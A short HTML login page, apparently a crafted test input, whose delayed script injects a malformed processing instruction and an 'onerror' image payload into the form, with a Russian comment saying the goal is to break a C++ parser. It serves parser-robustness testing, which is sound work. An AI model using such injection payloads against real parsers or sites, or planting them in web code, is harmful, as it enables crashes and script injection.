<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
<form id="f">
  <input name="user">
  <input type="password" name="pass">
</form>
<script>
setTimeout(() => {
  // инжектируем в DOM то, что сломает C++ парсер
  const pi = document.createProcessingInstruction("xml", "?>");
  document.getElementById("f").appendChild(pi);
  
  const d = document.createElement("div");
  d.innerHTML = '</form><img src=x onerror=alert(1)>';
  document.getElementById("f").appendChild(d);
}, 3000);
</script>
</body>
</html>
